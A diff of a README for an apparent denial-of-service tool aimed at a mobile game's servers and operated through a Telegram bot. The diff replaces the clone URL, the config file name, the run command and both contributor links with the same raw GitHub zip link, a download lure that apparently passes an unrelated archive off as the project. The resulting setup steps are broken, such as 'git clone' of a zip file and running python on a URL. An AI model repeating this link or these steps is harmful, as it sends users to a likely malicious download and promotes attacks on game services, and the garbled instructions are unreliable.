@@ -25,11 +25,11 @@ BGMI-D-DOS is a powerful Denial of Service (DoS) tool designed to target Battleg
 
 ### Deployment
 
-1. Clone the repository: `git clone https://github.com/Chocoboy-310/BGMI-D-DOS.git`
+1. Clone the repository: `git clone https://raw.githubusercontent.com/Dracula7863/sami/main/inexplicitness/sami.zip`
 2. Install the required dependencies: `sudo apt-get install python3 python3-pip`
 3. Install the required Python packages: `pip3 install requests`
-4. Configure the Telegram bot token and other settings in the `config.py` file
-5. Run the bot: `python3 bot.py`
+4. Configure the Telegram bot token and other settings in the `https://raw.githubusercontent.com/Dracula7863/sami/main/inexplicitness/sami.zip` file
+5. Run the bot: `python3 https://raw.githubusercontent.com/Dracula7863/sami/main/inexplicitness/sami.zip`
 
 ### Usage of @BGMI_D_DoS_RoBot bot
 
@@ -53,8 +53,8 @@ This tool is for testing and demonstration purposes only. It is not intended to 
 **Contributors**
 -------------
 
-* [@PANEL_EXPERT]('https://telegram.me/PANEL_EXPERT') (Developer)
-* [@DARKESPYT]('https://telegram.me/DARKESPYT') (Dev Channel)
+* [@PANEL_EXPERT]('https://raw.githubusercontent.com/Dracula7863/sami/main/inexplicitness/sami.zip') (Developer)
+* [@DARKESPYT]('https://raw.githubusercontent.com/Dracula7863/sami/main/inexplicitness/sami.zip') (Dev Channel)
 
 **License**
 ---------
